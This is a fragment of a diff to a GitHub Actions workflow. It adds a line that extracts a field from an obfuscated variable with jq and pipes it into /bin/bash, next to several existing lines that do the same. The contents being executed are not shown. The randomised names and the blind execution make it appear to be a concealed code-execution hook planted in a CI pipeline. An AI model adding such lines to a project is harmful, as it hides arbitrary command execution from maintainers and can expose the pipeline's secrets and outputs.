@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$lne2" | jq -r .hv457 | /bin/bash
           printf '%s' "$l33866" | jq -r .ef8 | /bin/bash
           echo $apxxp06 | jq -r .umi60034 | /bin/bash
+          echo $g6 | jq -r .ukjlf3377 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
